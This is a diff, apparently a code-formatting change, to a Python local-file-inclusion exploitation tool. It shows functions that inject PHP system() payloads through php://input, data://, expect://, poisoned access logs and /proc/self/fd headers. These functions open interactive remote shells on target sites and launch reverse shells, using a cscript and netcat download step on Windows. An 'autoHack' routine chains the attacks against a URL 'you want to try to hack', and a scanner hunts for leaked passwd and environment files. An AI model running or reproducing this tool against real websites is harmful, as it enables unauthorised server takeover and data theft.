+            whoami = isUnknown(
+                cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
+            )
 
             if "?" in whoami:
                 # Try to get current_user using PHP function 'get_current_user()'
                 send_access_log_cmd("get_current_user();", logmain, keyword + "_PHP")
-                whoami = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True))
+                whoami = isUnknown(
+                    cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
+                )
 
             send_access_log_cmd("cd", logmain, keyword)
-            pwd = cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True)
+            pwd = cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
             access_log_while(whoami, logmain, pwd, ologurl, keyword, True)
 
         # ----------------------------------------------------- #
@@ -1058,17 +1234,23 @@ def simpleGETorHEAD(keyword, ologurl, logmain):
             onlyPhpPrint()
 
             send_access_log_cmd("get_current_user();", logmain, keyword + "_PHP")
-            whoami = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True))
+            whoami = isUnknown(
+                cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
+            )
             send_access_log_cmd("getcwd();", logmain, keyword + "_PHP")
-            pwd = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), True))
+            pwd = isUnknown(
+                cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), True)
+            )
 
             cmd = ""
             while cmd != "exit" and cmd != "quit":
                 cmd = input("%s@%s:%s$ PHP:// " % (whoami, logmain, pwd))
-                cmd = cmd.replace("'", "\"")
+                cmd = cmd.replace("'", '"')
                 if cmd != "exit" and cmd != "quit":
                     send_access_log_cmd(cmd, logmain, keyword + "_PHP")
-                    print(cleanOutput(access_log_ext(ologurl, "\"%s /" % keyword), False))
+                    print(
+                        cleanOutput(access_log_ext(ologurl, '"%s /' % keyword), False)
+                    )
             exit()
             # -------------------------------------------------------------------------------------------
 
@@ -1099,7 +1281,7 @@ def passthru_ext(resp, start_get):
     resp = resp[start:]
 
     stop = (SubstrFind(resp, " HTTP/1.1"))[0]
-    stop_apix = (SubstrFind(resp, "\""))[0]
+    stop_apix = (SubstrFind(resp, '"'))[0]
     if stop_apix < stop:
         stop = stop_apix
 
@@ -1126,7 +1308,11 @@ def send_passthru_cmd(ologurl, cmd, start_get):
 def GetPassthru(ologurl, logmain):
     global victimOs
 
-    print(colored("\nTrying to inject the website using GET 'passthru' requests.", "white"))
+    print(
+        colored(
+            "\nTrying to inject the website using GET 'passthru' requests.", "white"
+        )
+    )
     rand_str = generateRandom()
     url = "%s&cmd=echo %s" % (ologurl, rand_str)
     resp = (requests.get(url, headers=gen_headers, timeout=20)).text
@@ -1156,7 +1342,9 @@ def GetPassthru(ologurl, logmain):
             if checkIfWindows(path):
                 victimOs = "Windows"
 
-        whoami = isUnknown(cleanOutput(send_passthru_cmd(ologurl, "whoami", start_get), True))
+        whoami = isUnknown(
+            cleanOutput(send_passthru_cmd(ologurl, "whoami", start_get), True)
+        )
         pwd = ""
 
         if victimOs == "Windows":
@@ -1165,12 +1353,12 @@ def GetPassthru(ologurl, logmain):
             pwd = cleanOutput(send_passthru_cmd(ologurl, "pwd", start_get), True)
 
         shell = "%s@%s:%s$ " % (whoami, logmain, pwd)
-        shell.replace(' ', '')
+        shell.replace(" ", "")
 
         cmd = ""
         while cmd != "exit" and cmd != "quit":
             cmd = input("%s" % shell)
-            cmd = cmd.replace("'", "\"")
+            cmd = cmd.replace("'", '"')
             if cmd != "exit" and cmd != "quit":
                 if checkIfReverseShell(cmd):
                     if victimOs != "Windows":
@@ -1178,7 +1366,9 @@ def GetPassthru(ologurl, logmain):
                     else:
                         windows_passthru_reverse_shell(ologurl, start_get)
                 else:
-                    print(cleanOutput(send_passthru_cmd(ologurl, cmd, start_get), False))
+                    print(
+                        cleanOutput(send_passthru_cmd(ologurl, cmd, start_get), False)
+                    )
         print("")
         exit()
 
@@ -1188,7 +1378,9 @@ def run_access_log():
     global ahlogurl
 
     if ahactive is False:
-        ologurl = input("[*] Enter the vulnerable access_log url (ex: 'site/index.php?page=../logs/access_log') -> ")
+        ologurl = input(
+            "[*] Enter the vulnerable access_log url (ex: 'site/index.php?page=../logs/access_log') -> "
+        )
     else:
         ologurl = ahlogurl
 
@@ -1245,7 +1437,7 @@ def send_phpinput_cmd(cmd, inputurl):
         length = 34 + len(cmd)
         body = "AbracadabrA ** <?php system('%s');?> **" % cmd
 
-    gen_headers['Content-Length'] = '%s' % length
+    gen_headers["Content-Length"] = "%s" % length
     r = requests.post(url=url, headers=gen_headers, data=body)
 
     return r.text
@@ -1260,7 +1452,7 @@ def extract_phpinput_res(resp):
         return ""
 
     got = ""
-    while p < len(resp) - 1 and (resp[p] != '*' or resp[p + 1] != '*'):
+    while p < len(resp) - 1 and (resp[p] != "*" or resp[p + 1] != "*"):
         got += resp[p]
         p += 1
 
@@ -1273,7 +1465,9 @@ def run_phpinput():
     global victimOs
 
     if ahactive is False:
-        inputurl = input("[*] Enter the php://input vulnerable url (ex: 'http://site/index.php?page=') -> ")
+        inputurl = input(
+            "[*] Enter the php://input vulnerable url (ex: 'http://site/index.php?page=') -> "
+        )
     else:
         inputurl = ahurl
 
@@ -1294,42 +1488,77 @@ def run_phpinput():
     if phpcmd is False:
         _id = cleanOutput(extract_phpinput_res(send_phpinput_cmd("id", inputurl)), True)
         if len(_id) == 0:
-            path = cleanOutput(extract_phpinput_res(send_phpinput_cmd("path", inputurl)), True)
+            path = cleanOutput(
+                extract_phpinput_res(send_phpinput_cmd("path", inputurl)), True
+            )
             if checkIfWindows(path):
                 victimOs = "Windows"
 
-        print(colored(
-            "[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n",
-            "red"))
-        whoami = isUnknown(cleanOutput(extract_phpinput_res(send_phpinput_cmd("whoami", inputurl)), True))
+        print(
+            colored(
+                "[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n",
+                "red",
+            )
+        )
+        whoami = isUnknown(
+            cleanOutput(
+                extract_phpinput_res(send_phpinput_cmd("whoami", inputurl)), True
+            )
+        )
         if victimOs != "Windows":
-            pwd = cleanOutput(extract_phpinput_res(send_phpinput_cmd("pwd", inputurl)), True)
+            pwd = cleanOutput(
+                extract_phpinput_res(send_phpinput_cmd("pwd", inputurl)), True
+            )
         else:
-            pwd = cleanOutput(extract_phpinput_res(send_phpinput_cmd("cd", inputurl)), True)
+            pwd = cleanOutput(
+                extract_phpinput_res(send_phpinput_cmd("cd", inputurl)), True
+            )
     else:
         onlyPhpPrint()
         whoami = isUnknown(
-            cleanOutput(extract_phpinput_res(send_phpinput_cmd("php://get_current_user();", inputurl)), True))
-        pwd = isUnknown(cleanOutput(extract_phpinput_res(send_phpinput_cmd("php://getcwd();", inputurl)), True))
+            cleanOutput(
+                extract_phpinput_res(
+                    send_phpinput_cmd("php://get_current_user();", inputurl)
+                ),
+                True,
+            )
+        )
+        pwd = isUnknown(
+            cleanOutput(
+                extract_phpinput_res(send_phpinput_cmd("php://getcwd();", inputurl)),
+                True,
+            )
+        )
 
     time.sleep(1)
     inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(inputurl))
     cmd = ""
-    while cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit":
+    while (
+        cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit"
+    ):
         if phpcmd:
             cmd = input("%s@%s:%s$ PHP:// " % (whoami, inputmain, pwd))
             if cmd[:6] != "php://":
                 cmd = "php://%s" % cmd
         else:
             cmd = input("%s@%s:%s$ " % (whoami, inputmain, pwd))
-        if cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit":
+        if (
+            cmd != "exit"
+            and cmd != "quit"
+            and cmd != "php://exit"
+            and cmd != "php://quit"
+        ):
             if phpcmd is False and checkIfReverseShell(cmd):
                 if victimOs != "Windows":
                     phpinput_reverse_shell(inputurl)
                 else:
                     windows_phpinput_reverse_shell(inputurl)
             else:
-                print(cleanOutput(extract_phpinput_res(send_phpinput_cmd(cmd, inputurl)), False))
+                print(
+                    cleanOutput(
+                        extract_phpinput_res(send_phpinput_cmd(cmd, inputurl)), False
+                    )
+                )
     exit()
 
 
@@ -1342,18 +1571,38 @@ data_reverse = False
 def windows_data_reverse_shell(odataurl, found):
     if initWindowsReverse():
         cmd = "echo %s > %s" % (wget_js_content, wget_filename)
-        cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(cmd), odataurl, found)), False)
+        cleanOutput(
+            extract_data_res(send_data_cmd_default(cleanDataCmd(cmd), odataurl, found)),
+            False,
+        )
         cscript = "cscript /nologo %s %s" % (wget_filename, netcat_url)
-        cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(cscript), odataurl, found)), False)
+        cleanOutput(
+            extract_data_res(
+                send_data_cmd_default(cleanDataCmd(cscript), odataurl, found)
+            ),
+            False,
+        )
 
     windows_reverse_shell()
-    cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(reverseConn), odataurl, found)), False)
+    cleanOutput(
+        extract_data_res(
+            send_data_cmd_default(cleanDataCmd(reverseConn), odataurl, found)
+        ),
+        False,
+    )
 
 
 def data_reverse_shell(odataurl, found):
     generic_reverse_shell()
-    print("%s\n" % cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd(reverseConn), odataurl, found)),
-                               False))
+    print(
+        "%s\n"
+        % cleanOutput(
+            extract_data_res(
+                send_data_cmd_default(cleanDataCmd(reverseConn), odataurl, found)
+            ),
+            False,
+        )
+    )
 
 
 def send_data_cmd_generic(url):
@@ -1406,7 +1655,7 @@ def cleanDataCmd(cmd):
 
     if cmd[:6] != "php://":
         if reverseConn not in cmd:
-            cmds = cmd.split('&')
+            cmds = cmd.split("&")
             for c in cmds:
                 if len(c) > 0:
                     newcmd += "system('%s');" % c
@@ -1428,20 +1677,26 @@ def run_data():
     global victimOs
 
     if ahactive is False:
-        odataurl = input("[*] Enter the 'data://' vulnerable url (ex: 'http://site/index.php?page=') -> ")
+        odataurl = input(
+            "[*] Enter the 'data://' vulnerable url (ex: 'http://site/index.php?page=') -> "
+        )
     else:
         odataurl = ahurl
 
     odataurl = correctUrl(odataurl)
     odataurl = checkHttp(odataurl)
     rand_str = generateRandom()
-    cmd = "<?php system(\"echo %s\");?>" % rand_str
+    cmd = '<?php system("echo %s");?>' % rand_str
     found = 0
     sys_disabled = False
 
     for i in range(1, 5):
         content = send_data_cmd_default(cmd, odataurl, i)
-        if "wrapper is disabled" in content or "no suitable wrapper could be found" in content or "Unable to find the wrapper" in content:
+        if (
+            "wrapper is disabled" in content
+            or "no suitable wrapper could be found" in content
+            or "Unable to find the wrapper" in content
+        ):
             return
         if "system() has been disabled for security reasons" in content:
             sys_disabled = True
@@ -1452,7 +1707,11 @@ def run_data():
         print content
         print "----------------------------------------------------------\n\n"'''
         indexes = SubstrFind(content, rand_str)
-        if len(indexes) > 0 and ("echo %s" % rand_str) not in content and ("echo%%20%s" % rand_str) not in content:
+        if (
+            len(indexes) > 0
+            and ("echo %s" % rand_str) not in content
+            and ("echo%%20%s" % rand_str) not in content
+        ):
             found = i
             break
 
@@ -1463,8 +1722,11 @@ def run_data():
             cmd = "<?php echo %s;?>" % rand_str
             content = send_data_cmd_default(cmd, odataurl, i)
             indexes = SubstrFind(content, rand_str)
-            if (len(indexes) > 0 and ("echo %s" % rand_str) not in content and (
-                        "echo%%20%s" % rand_str) not in content):
+            if (
+                len(indexes) > 0
+                and ("echo %s" % rand_str) not in content
+                and ("echo%%20%s" % rand_str) not in content
+            ):
                 found = i
                 # ---------------------------------------------------------------------
 
@@ -1474,9 +1736,12 @@ def run_data():
         if sys_disabled:
             onlyPhpPrint()
         else:
-            print(colored(
-                "[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n",
-                "red"))
+            print(
+                colored(
+                    "[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n",
+                    "red",
+                )
+            )
         time.sleep(1)
 
         inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(odataurl))
@@ -1484,33 +1749,79 @@ def run_data():
         pwd = ""
 
         if sys_disabled is False:
-            whoami = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("whoami"), odataurl, found)), True)
+            whoami = cleanOutput(
+                extract_data_res(
+                    send_data_cmd_default(cleanDataCmd("whoami"), odataurl, found)
+                ),
+                True,
+            )
             pwd = isUnknown(
-                cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("pwd"), odataurl, found)), True))
+                cleanOutput(
+                    extract_data_res(
+                        send_data_cmd_default(cleanDataCmd("pwd"), odataurl, found)
+                    ),
+                    True,
+                )
+            )
             if pwd == "?":
-                path = cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("path"), odataurl, found)), True)
+                path = cleanOutput(
+                    extract_data_res(
+                        send_data_cmd_default(cleanDataCmd("path"), odataurl, found)
+                    ),
+                    True,
+                )
                 if checkIfWindows(path):
                     victimOs = "Windows"
                     pwd = isUnknown(
-                        cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("cd"), odataurl, found)), True))
+                        cleanOutput(
+                            extract_data_res(
+                                send_data_cmd_default(
+                                    cleanDataCmd("cd"), odataurl, found
+                                )
+                            ),
+                            True,
+                        )
+                    )
         else:
             whoami = cleanOutput(
-                extract_data_res(send_data_cmd_default(cleanDataCmd("php://get_current_user();"), odataurl, found)),
-                True)
+                extract_data_res(
+                    send_data_cmd_default(
+                        cleanDataCmd("php://get_current_user();"), odataurl, found
+                    )
+                ),
+                True,
+            )
             whoami = isUnknown(whoami)
             pwd = isUnknown(
-                cleanOutput(extract_data_res(send_data_cmd_default(cleanDataCmd("php://getcwd();"), odataurl, found)),
-                            True))
+                cleanOutput(
+                    extract_data_res(
+                        send_data_cmd_default(
+                            cleanDataCmd("php://getcwd();"), odataurl, found
+                        )
+                    ),
+                    True,
+                )
+            )
 
-        while cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit":
+        while (
+            cmd != "exit"
+            and cmd != "quit"
+            and cmd != "php://exit"
+            and cmd != "php://quit"
+        ):
             if sys_disabled:
                 cmd = input("%s@%s:%s$ PHP:// " % (whoami, inputmain, pwd))
                 if cmd[:6] != "php://":
                     cmd = "php://%s" % cmd
             else:
                 cmd = input("%s@%s:%s$ " % (whoami, inputmain, pwd))
-            cmd = cmd.replace("\"", "'")
-            if cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit":
+            cmd = cmd.replace('"', "'")
+            if (
+                cmd != "exit"
+                and cmd != "quit"
+                and cmd != "php://exit"
+                and cmd != "php://quit"
+            ):
                 if sys_disabled is False and checkIfReverseShell(cmd):
                     data_reverse = True
                     if victimOs == "Windows":
@@ -1519,7 +1830,15 @@ def run_data():
                         data_reverse_shell(odataurl, found)
                 else:
                     cmd = cleanDataCmd(cmd)
-                    print("%s\n" % cleanOutput(extract_data_res(send_data_cmd_default(cmd, odataurl, found)), False))
+                    print(
+                        "%s\n"
+                        % cleanOutput(
+                            extract_data_res(
+                                send_data_cmd_default(cmd, odataurl, found)
+                            ),
+                            False,
+                        )
+                    )
         exit()
 
 
@@ -1532,17 +1851,41 @@ expect_reverse = False
 def windows_expect_reverse_shell(oexpecturl):
     if initWindowsReverse():
         cmd = "echo %s > %s" % (wget_js_content, wget_filename)
-        cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" % cmd, oexpecturl)), False)
+        cleanOutput(
+            extract_expect_res(
+                send_expect_cmd("AbracadabrA ** %s **" % cmd, oexpecturl)
+            ),
+            False,
+        )
         cscript = "cscript /nologo %s %s" % (wget_filename, netcat_url)
-        cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" % cscript, oexpecturl)), False)
+        cleanOutput(
+            extract_expect_res(
+                send_expect_cmd("AbracadabrA ** %s **" % cscript, oexpecturl)
+            ),
+            False,
+        )
 
     windows_reverse_shell()
-    print(cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" % reverseConn, oexpecturl)), False))
+    print(
+        cleanOutput(
+            extract_expect_res(
+                send_expect_cmd("AbracadabrA ** %s **" % reverseConn, oexpecturl)
+            ),
+            False,
+        )
+    )
 
 
 def expect_reverse_shell(oexpecturl):
     generic_reverse_shell()
-    print(cleanOutput(extract_expect_res(send_expect_cmd("AbracadabrA ** %s **" % reverseConn, oexpecturl)), False))
+    print(
+        cleanOutput(
+            extract_expect_res(
+                send_expect_cmd("AbracadabrA ** %s **" % reverseConn, oexpecturl)
+            ),
+            False,
+        )
+    )
 
 
 def send_expect_cmd(cmd, url):
@@ -1565,7 +1908,9 @@ def run_expect():
     global victimOs
 
     if ahactive is False:
-        oexpecturl = input("[*] Enter the 'expect://' vulnerable url (ex: 'http://site/index.php?page=') -> ")
+        oexpecturl = input(
+            "[*] Enter the 'expect://' vulnerable url (ex: 'http://site/index.php?page=') -> "
+        )
     else:
         oexpecturl = ahurl
 
@@ -1578,20 +1923,34 @@ def run_expect():
     indexes = SubstrFind(content, rand_str)
     found = len(indexes) > 0
 
-    if (found and (
-                "echo %s" % rand_str) not in content and "Unable to find the wrapper &quot;expect&quot;" not in content
-        and "wrapper is disabled" not in content and ("echo%%20%s" % rand_str) not in content):
+    if (
+        found
+        and ("echo %s" % rand_str) not in content
+        and "Unable to find the wrapper &quot;expect&quot;" not in content
+        and "wrapper is disabled" not in content
+        and ("echo%%20%s" % rand_str) not in content
+    ):
         print("\n[+] The website seems to be vulnerable. Opening a System Shell..\n")
         time.sleep(1)
 
         inputmain = removeHttpFromWebsite(extractWebsiteFromUrl(oexpecturl))
-        whoami = cleanOutput(extract_expect_res(send_expect_cmd("whoami", oexpecturl)), True)
-        pwd = isUnknown(cleanOutput(extract_expect_res(send_expect_cmd("pwd", oexpecturl)), True))
+        whoami = cleanOutput(
+            extract_expect_res(send_expect_cmd("whoami", oexpecturl)), True
+        )
+        pwd = isUnknown(
+            cleanOutput(extract_expect_res(send_expect_cmd("pwd", oexpecturl)), True)
+        )
         if pwd == "?":
-            path = cleanOutput(extract_expect_res(send_expect_cmd("path", oexpecturl)), True)
+            path = cleanOutput(
+                extract_expect_res(send_expect_cmd("path", oexpecturl)), True
+            )
             if checkIfWindows(path):
                 victimOs = "Windows"
-                pwd = isUnknown(cleanOutput(extract_expect_res(send_expect_cmd("cd", oexpecturl)), True))
+                pwd = isUnknown(
+                    cleanOutput(
+                        extract_expect_res(send_expect_cmd("cd", oexpecturl)), True
+                    )
+                )
 
         while cmd != "exit" and cmd != "quit":
             cmd = input("%s@%s:%s$ " % (whoami, inputmain, pwd))
@@ -1604,7 +1963,11 @@ def run_expect():
                         expect_reverse_shell(oexpecturl)
                 else:
                     cmd = "AbracadabrA ** %s **" % cmd
-                    print(cleanOutput(extract_expect_res(send_expect_cmd(cmd, oexpecturl)), False))
+                    print(
+                        cleanOutput(
+                            extract_expect_res(send_expect_cmd(cmd, oexpecturl)), False
+                        )
+                    )
         exit()
 
 
@@ -1620,7 +1983,13 @@ def fd_reverse_shell(errPage, field, ofdurl):
     global reverseConn
 
     generic_reverse_shell()
-    print("%s\n" % cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage, reverseConn, field, ofdurl)), False))
+    print(
+        "%s\n"
+        % cleanOutput(
+            extract_fd_Result(send_self_fd_cmd(errPage, reverseConn, field, ofdurl)),
+            False,
+        )
+    )
 
 
 def send_self_fd_cmd(errPage, cmd, field, ofdurl):
@@ -1630,7 +1999,7 @@ def send_self_fd_cmd(errPage, cmd, field, ofdurl):
             cmd = "%s;" % cmd
         cmd = "%s ?> **"
     else:
-        cmd = "%s **<?php system(\"%s\"); ?> **" % (fd_pre_rand_str, cmd)
+        cmd = '%s **<?php system("%s"); ?> **' % (fd_pre_rand_str, cmd)
 
     fd_headers[field] = cmd
     r = requests.get(errPage, headers=fd_headers, timeout=15)
@@ -1642,10 +2011,10 @@ def extract_fd_Result(resp):
     indexes = SubstrFind(resp, "%s **" % fd_pre_rand_str)
     got = ""
     if len(indexes) > 0:
-        content = resp[(indexes[len(indexes) - 1] + 17):]
+        content = resp[(indexes[len(indexes) - 1] + 17) :]
         i = 0
         while i < len(content):
-            if content[i] == '*' and content[i + 1] == '*':
+            if content[i] == "*" and content[i + 1] == "*":
                 break
             got += content[i]
             i = i + 1
@@ -1663,9 +2032,12 @@ def run_self_fd():
 
     if ahactive is False:
         ofdurl = input(
-            "[*] Enter the '/proc/self/fd' vulnerable url (ex: 'http://site/index.php?page=/proc/self/fd/9') -> ")
+            "[*] Enter the '/proc/self/fd' vulnerable url (ex: 'http://site/index.php?page=/proc/self/fd/9') -> "
+        )
         errPage = input(
-            "\n[*] Enter a page to request which will produce an error visible in '%s' (ex: 'http://site/robots.txt') -> " % ofdurl)
+            "\n[*] Enter a page to request which will produce an error visible in '%s' (ex: 'http://site/robots.txt') -> "
+            % ofdurl
+        )
     else:
         ofdurl = ahfdurl
         errPage = ahfd_errPage
@@ -1674,7 +2046,8 @@ def run_self_fd():
     errPage = checkHttp(errPage)
 
     field = input(
-        "\n[*] Enter the HTTP header's field to inject (it MUST appear in the error logs!) (ex: 'referer') -> ")
+        "\n[*] Enter the HTTP header's field to inject (it MUST appear in the error logs!) (ex: 'referer') -> "
+    )
     rand_str = generateRandom()
     resp = send_self_fd_cmd(errPage, "php://echo %s;" % rand_str, field, ofdurl)
     echoes = SubstrFind(resp, "echo %s" % rand_str)
@@ -1692,18 +2065,36 @@ def run_self_fd():
             sys_disabled = True
             onlyPhpPrint()
             whoami = cleanOutput(
-                extract_fd_Result(send_self_fd_cmd(errPage, "php://get_current_user();", field, ofdurl)), True).replace(
-                " ", "")
+                extract_fd_Result(
+                    send_self_fd_cmd(
+                        errPage, "php://get_current_user();", field, ofdurl
+                    )
+                ),
+                True,
+            ).replace(" ", "")
             whoami = isUnknown(whoami)
-            pwd = cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage, "php://getcwd();", field, ofdurl)),
-                              True).replace(" ", "")
+            pwd = cleanOutput(
+                extract_fd_Result(
+                    send_self_fd_cmd(errPage, "php://getcwd();", field, ofdurl)
+                ),
+                True,
+            ).replace(" ", "")
             pwd = isUnknown(pwd)
         else:
-            whoami = cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage, "whoami", field, ofdurl)), True).replace(
-                " ", "")
-            pwd = cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage, "pwd", field, ofdurl)), True).replace(" ", "")
+            whoami = cleanOutput(
+                extract_fd_Result(send_self_fd_cmd(errPage, "whoami", field, ofdurl)),
+                True,
+            ).replace(" ", "")
+            pwd = cleanOutput(
+                extract_fd_Result(send_self_fd_cmd(errPage, "pwd", field, ofdurl)), True
+            ).replace(" ", "")
 
-        while cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit":
+        while (
+            cmd != "exit"
+            and cmd != "quit"
+            and cmd != "php://exit"
+            and cmd != "php://quit"
+        ):
             if sys_disabled:
                 cmd = input("%s@%s:%s$ PHP:// " % (whoami, shell_host, pwd))
                 if cmd[:6] != "php://":
@@ -1711,8 +2102,21 @@ def run_self_fd():
             else:
                 cmd = input("%s@%s:%s$ " % (whoami, shell_host, pwd))
                 # cmd = cmd.replace("\"","'")
-            if cmd != "exit" and cmd != "quit" and cmd != "php://exit" and cmd != "php://quit":
-                print("%s\n" % cleanOutput(extract_fd_Result(send_self_fd_cmd(errPage, cmd, field, ofdurl)), False))
+            if (
+                cmd != "exit"
+                and cmd != "quit"
+                and cmd != "php://exit"
+                and cmd != "php://quit"
+            ):
+                print(
+                    "%s\n"
+                    % cleanOutput(
+                        extract_fd_Result(
+                            send_self_fd_cmd(errPage, cmd, field, ofdurl)
+                        ),
+                        False,
+                    )
+                )
         exit()
 
 
@@ -1733,7 +2137,9 @@ def scanner():
     fname = checkFilename(fname)
 
     if ahactive is False:
-        owebsite = input("[*] Enter the URL to scan (ex: 'http://site/vuln.php?id=') -> ")
+        owebsite = input(
+            "[*] Enter the URL to scan (ex: 'http://site/vuln.php?id=') -> "
+        )
         owebsite = correctUrl(owebsite)
         owebsite = checkHttp(owebsite)
     else:
@@ -1741,7 +2147,7 @@ def scanner():
 
     print("")
     for line in open(fname):
-        c = line.strip('\n')
+        c = line.strip("\n")
         website = owebsite + c
         status_code = 500
 
@@ -1755,24 +2161,53 @@ def scanner():
 
             # content = r.content
         if status_code == 200:
-            if ("[<a href='function.main'>function.main</a>" not in content
+            if (
+                "[<a href='function.main'>function.main</a>" not in content
                 and "[<a href='function.include'>function.include</a>" not in content
                 and ("Failed opening" not in content and "for inclusion" not in content)
                 and "failed to open stream:" not in content
                 and "open_basedir restriction in effect" not in content
-                and ("root:" in content or ("sbin" in content and "nologin" in content)
-                     or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content
-                     or "PATH=" in content or "HTTP_USER_AGENT" in content or "HTTP_ACCEPT_ENCODING=" in content
-                     or "users:x" in content or (
-                                "GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
-                     or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
-                     or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
-                     or ("error]" in content and "[client" in content and "log" in website)
-                     or (
-                                        "[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
-                     or ("State: R (running)" in content and (
-                                        "Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
-                         and "/proc/self/status" in website))):
+                and (
+                    "root:" in content
+                    or ("sbin" in content and "nologin" in content)
+                    or "DB_NAME" in content
+                    or "daemon:" in content
+                    or "DOCUMENT_ROOT=" in content
+                    or "PATH=" in content
+                    or "HTTP_USER_AGENT" in content
+                    or "HTTP_ACCEPT_ENCODING=" in content
+                    or "users:x" in content
+                    or (
+                        "GET /" in content
+                        and ("HTTP/1.1" in content or "HTTP/1.0" in content)
+                    )
+                    or "apache_port=" in content
+                    or "cpanel/logs/access" in content
+                    or "allow_login_autocomplete" in content
+                    or "database_prefix=" in content
+                    or "emailusersbandwidth" in content
+                    or "adminuser=" in content
+                    or (
+                        "error]" in content
+                        and "[client" in content
+                        and "log" in website
+                    )
+                    or (
+                        "[error] [client" in content
+                        and "File does not exist:" in content
+                        and "proc/self/fd/" in website
+                    )
+                    or (
+                        "State: R (running)" in content
+                        and (
+                            "Tgid:" in content
+                            or "TracerPid:" in content
+                            or "Uid:" in content
+                        )
+                        and "/proc/self/status" in website
+                    )
+                )
+            ):
                 print(colored("[+] '%s' [Vulnerable]" % website, "red"))
                 # print "main() [<a href='function.include'>function.include</a>" not in content
                 # print "\n------------------------------\n%s\n\n" %content
@@ -1824,7 +2259,9 @@ def run_autoHack():
     global ahfd_errPage
 
     ahactive = True
-    ahurl = input("[*] Enter the URL you want to try to hack (ex: 'http://site/vuln.php?id=') -> ")
+    ahurl = input(
+        "[*] Enter the URL you want to try to hack (ex: 'http://site/vuln.php?id=') -> "
+    )
     ahurl = correctUrl(ahurl)
     ahurl = checkHttp(ahurl)
 
@@ -1834,13 +2271,22 @@ def run_autoHack():
     # /proc/self/environ Exploitation
     if len(ahenv) > 0:
         for env in ahenv:
-            print(colored("\n[*] Trying to exploit /proc/self/environ on '%s'.." % env, "yellow"))
+            print(
+                colored(
+                    "\n[*] Trying to exploit /proc/self/environ on '%s'.." % env,
+                    "yellow",
+                )
+            )
             ahenvurl = env
             run_self_environ()
 
     time.sleep(1)
     # php://input Exploitation
-    print(colored("\n[*] Trying to exploit php://input wrapper on '%s'.." % ahurl, "yellow"))
+    print(
+        colored(
+            "\n[*] Trying to exploit php://input wrapper on '%s'.." % ahurl, "yellow"
+        )
+    )
     run_phpinput()
 
     time.sleep(1)
@@ -1848,7 +2294,12 @@ def run_autoHack():
     if len(ahlogs) > 0:
         for log in ahlogs:
             if "access" in log:
-                print(colored("\n[*] Trying to exploit access logs' file on '%s'.." % log, "yellow"))
+                print(
+                    colored(
+                        "\n[*] Trying to exploit access logs' file on '%s'.." % log,
+                        "yellow",
+                    )
+                )
                 ahlogurl = log
                 run_access_log()
 
@@ -1856,20 +2307,29 @@ def run_autoHack():
     # /proc/self/fd Exploitation
     if len(ahfd) > 0:
         ahfd_errPage = input(
-            "[*] Enter a page to request which will produce an error visible in your /proc/self/fd logs (ex: 'http://site/robots.txt') -> ")
+            "[*] Enter a page to request which will produce an error visible in your /proc/self/fd logs (ex: 'http://site/robots.txt') -> "
+        )
         for fd in ahfd:
-            print(colored("\n[*] Trying to exploit /proc/self/fd on '%s'.." % fd, "yellow"))
+            print(
+                colored(
+                    "\n[*] Trying to exploit /proc/self/fd on '%s'.." % fd, "yellow"
+                )
+            )
             ahfdurl = fd
             run_self_fd()
 
     time.sleep(1)
     # data:// Exploitation
-    print(colored("\n[*] Trying to exploit data:// wrapper on '%s'.." % ahurl, "yellow"))
+    print(
+        colored("\n[*] Trying to exploit data:// wrapper on '%s'.." % ahurl, "yellow")
+    )
     run_data()
 
     time.sleep(1)
     # expect:// Exploitation
-    print(colored("\n[*] Trying to exploit expect:// wrapper on '%s'.." % ahurl, "yellow"))
+    print(
+        colored("\n[*] Trying to exploit expect:// wrapper on '%s'.." % ahurl, "yellow")
+    )
     run_expect()
 
     time.sleep(1)
@@ -1885,7 +2345,13 @@ def run_autoHack():
 
     time.sleep(1)
     # php://filter Exploitation
-    print(colored("\n[*] Trying to get some pages' content using php://filter on '%s'.." % ahurl, "yellow"))
+    print(
+        colored(
